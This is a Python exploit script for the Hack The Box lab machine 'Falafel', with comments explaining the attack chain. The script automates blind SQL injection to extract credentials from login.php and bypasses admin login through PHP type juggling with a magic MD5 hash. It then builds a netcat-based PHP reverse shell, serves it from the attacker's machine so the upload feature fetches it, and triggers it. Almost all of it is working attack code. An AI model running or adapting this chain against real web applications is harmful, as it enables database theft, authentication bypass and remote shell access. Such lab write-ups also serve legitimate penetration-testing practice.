#!/bin/bash

#HTB Falafel

#--------------------------------------------------------------------------------------------------------

#Auth Bypass
#Log in requests differentiate based on if a username exists ("Wrong Identification in response")
#From this assume that the SQL query is something like:
#"SELECT * form users where username = '<<username>>'"
#Then if rows are returned it does another query to confirm the password
#
#Injecting something like admin' and '1'='1'-- -    --> NOTE THIS MUST BE "AND" SINCE WE NEED BOTH STATEMENTS TO EVALUATE TO TRUE to get a t/f response. If its or it will always be TRUE since admin is always admin
#This should terminate the rest of the query and return true with the response containing "Wrong identification: admin"
#We have Boolean based blind injection
#Extract username and password for the non admin user from the DB
#Need to decrypt the hash, so just do it online = 'juggling'
#After initial log in as the user "chris", shows that there is a type juggling vulnerability at the login 
#Extract the admin password hash instead and then figure out type juggling
#so the values being compared is the admin hash 0e462096931906507119562988736854 and a value we control
#use magic hashes so value we control is being md5 hashed and compared to user's pw value
#md5 of 240610708 = 0e462097431906509019562988736854 
#thus effectively comparing 0e462097431906509019562988736854 == 0e462096931906507119562988736854
#which is actually compariong 0 = 0 which is True
#--------------------------------------------------------------------------------------------------------
#RCE

import requests
import sys
import threading
import multiprocessing
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler
import re
import time

target = '10.10.10.73'
payload = "username+from+users+where+ID+=+'1'"
payload2 = "password+from+users+where+ID+=+'1'"

s = requests.Session()

SERVER_IP = "10.10.14.17" #Change me
SERVER_PORT = 9001

ATTACK_IP = "10.10.14.17" #Change me
ATTACK_PORT = "1234" #Change me

rev_shell_name = "B" * 232 + ".php"

#start web server to download payload
def start_server(SERVER_IP,SERVER_PORT):
        httpd = HTTPServer((SERVER_IP, SERVER_PORT), SimpleHTTPRequestHandler)
        print "Server started at "+SERVER_IP+":" + str(SERVER_PORT)
        buffer = 1
        httpd.serve_forever()


def loopThrougAscii(payload, target):
    extracted_data = ""
    possible_chars = range(32, 126)
    length = getLength(payload, target)
    print "(+)Extracting data... this may take a while"
    for num in range (1, (length+1)): 
        position = num
        for ascii_value in possible_chars:
            boolean_result = sqliInjection(payload, position, ascii_value, target)
            if boolean_result == True:
                readable_char = chr(ascii_value)
                extracted_data = extracted_data + readable_char
                sys.stdout.write(readable_char)
                sys.stdout.flush()
                break
    print "\n(+)Data: " + extracted_data
    return extracted_data


def sqliInjection(payload, pointer, ascii_value, target):
	proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
	injection_string = "username=admin'+and+ascii((substring((select+{}),{},1)))='{}'%23&password=admin".format(payload, pointer, ascii_value)
	url = "http://"+target + "/login.php"
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	data = injection_string
	r = requests.post(url, headers=headers, data=data, proxies=proxies)
    #Only want the content length since that is what we are basing our true/false result On (tested both and determined values)
	content_length = int(r.headers['Content-Length'])
	if content_length == 7091: #Change content legnth header or determinating factor
        #print "True Query"
		return True
	elif content_length == 7074: #Change content legnth header or determinating factor
        #print "False Query"
		return False
	else:
        #print "Something went wrong?"
		return False

def getLength(payload, target):
	proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
	print "(*)Determining expected length of data"
	for i in range(1,100):
		injection_string = "username=admin'+and+length((select+{}))='{}'%23&password=admin".format(payload, i)
		url = "http://"+target + "/login.php"
		headers = {"Content-Type": "application/x-www-form-urlencoded"}
		data = injection_string
		ver_length = requests.post(url, headers=headers, data=data, proxies=proxies)
		resp_length = int(ver_length.headers['Content-Length'])
		if resp_length == 7091:
			length = i
			print "(+)The length is: " + str(length) + " characters"
			return length
			break

def type_juggling_auth_bypass(target, username):
	proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
	print "(+)Logging in as " + username
	url = "http://"+target+"/login.php"
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	data = {"username": username, "password": "240610708"}
	r = s.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=True)
	if "Login Successful!" in r.text:
		print "(+)Logged in as admin"
	return s

def upload_via_url(target, s, rev_shell_name, ATTACK_IP, ATTACK_PORT, SERVER_PORT):
	proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
	print "(+)Creating rev shell"
	rev_shell = '''<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f");?>'''.format(ATTACK_IP, ATTACK_PORT)
	rev_shell_name = rev_shell_name + ".png"
	cmd = "echo '" + rev_shell + "' > " + rev_shell_name
	os.system(cmd)
	url = "http://"+target+"/upload.php"
	data = {"url":"http://"+ATTACK_IP+":"+str(SERVER_PORT)+"/"+rev_shell_name}
	r = s.post(url, headers=s.headers, cookies=s.cookies, data=data, proxies=proxies)
	unique_dir = str(r.text)
	unique_dir = re.search("\/var\/www\/html\/uploads\/(.*);", unique_dir).group(1)
	print "(+)Shell Uploaded to: /uploads/"+unique_dir
	return unique_dir
	

def call_shell(target, rev_shell_name, s, unique_dir):
	proxies = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
	url = "http://"+target+"/uploads/"+unique_dir+"/" + rev_shell_name
	print "(+)Calling Shell"
	r = requests.get(url, headers=s.headers, cookies=s.cookies, proxies=proxies)


username = loopThrougAscii(payload, target)
s = type_juggling_auth_bypass(target, username)
proc = multiprocessing.Process(target=start_server, args=(SERVER_IP,SERVER_PORT))
proc.start()
upload_dir = upload_via_url(target, s, rev_shell_name, ATTACK_IP, ATTACK_PORT, SERVER_PORT)
proc.terminate()
call_shell(target, rev_shell_name, s, upload_dir)




